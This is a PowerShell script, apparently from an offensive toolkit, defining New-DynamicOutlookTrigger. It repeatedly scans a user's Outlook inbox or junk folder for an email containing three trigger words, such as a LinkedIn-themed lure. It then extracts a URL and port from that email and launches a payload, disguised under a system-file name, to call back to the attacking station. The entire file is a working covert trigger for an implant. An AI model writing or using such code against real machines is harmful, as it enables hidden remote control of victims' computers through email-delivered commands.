<#
.Synopsis
   Monitors Outlook for a specific email, and when it arrives, starts a payload.
.DESCRIPTION
   Surveys the users Outlook application at a regular interval, in either the inbox or junk folder, for a trigger email, and then starts the specified payload.
   For an email to trigger the payload it must contain three specific keywords.  They delay interval can also be customized.
.EXAMPLE
   New-DynamicOutlookTrigger -Triggerwords cyber,LinkedIn,interested -payload C:\Windows\system32\msacm32.exe -delay 30

   This will set the trigger to monitor the user's inbox for any email containing the words cyber, LinkedIn, and interested in the body, with a 30 second delay between cycles.
   Once the trigger email is detected, it will trigger the payload msacm32.exe.
#>
function New-DynamicOutlookTrigger
{
    [CmdletBinding()]
    Param
    (
        # The exact trigger which starts the payload
        [Parameter(Mandatory=$true)]
        [ValidateCount(3,3)]
        [string[]]$Triggerwords,

        # The time to wait between mailbox sweeps
        [Parameter(Mandatory=$true)]
        $Delay,

        # The full path to location on disk of the payload
        [Parameter(Mandatory=$true)]
        $Payload,

        # Sets the script to monitor the user's junk folder, otherwise, the inbox is monitored
        [Parameter(Mandatory=$false)]
        [switch]$Junk
    )

    Begin
    {
        # Define the inbox (or Junk) and Deleted Items folders
        $DeletedFolder = 3
        if($Junk)
        {
            $olFolderNumber = 23
        }
        else
        {
            $olFolderNumber = 6
        }
    }
    Process
    {
        while($true)
        {
            # Define the Outlook Namespace
            $outlook = new-object -com outlook.application;
            $ns = $outlook.GetNameSpace("MAPI");
            write-verbose "Starting mailbox search"
            # Search the desired folder for a trigger email and execute
            $Folder = $ns.GetDefaultFolder($olFolderNumber)
            $Emails = $Folder.items
            $Emails | foreach {
                if($_.Body -match $Triggerwords[0] -and $_.Body -match $Triggerwords[1] -and $_.Body -match $Triggerwords[2])
                {
                    # Section off the body of the targe email and format it for more efficient searching
                    $EmailBody = $_.Body
                    $Body = Out-String -InputObject $EmailBody
                    $formatted = $Body -split ' '
                    # Search the contents for a URL and for a number in the port range
                    $URLRegex = "[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)"
                    $PortRegex = "^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$"
                    foreach($section in $formatted)
                    {
                        $URLSection = $Section | Select-string -Pattern $URLRegex
                        if($URLSection -ne $null)
                        {
                            $URLSplit = $URLSection -split '"'
                            $URL = $URLSplit[2]
                        }
                        $Portsection = $section | Select-String -Pattern $PortRegex
                        if($Portsection -ne $null)
                        {
                            $Port = $Portsection
                        }
                    }
                    # convert URL to an IP address, and catch any errors
                    Write-Verbose "URL is set to $URL"
                    Write-verbose "Port is set to $Port"
                    try{
                        $lookup = [System.Net.DNS]::GetHostEntry($URL)
                        Write-verbose "Lookup is set to $Lookup"
                    }
                    Catch [System.Exception]
                    {
                        $Null
                    }
                    [Net.IPAddress]$IP = ($lookup.AddressList[0]).IPAddressToString
                    # Schedule the payload to call back to the attacking station
                    echo "The payload will call out to the IP $IP on the port $Port" > C:\payload.txt
                    Start-Process $payload -ArgumentList "C:\payload.txt"
                }
            }
            Start-sleep $Delay
        } 
    }
    End
    {
    }
}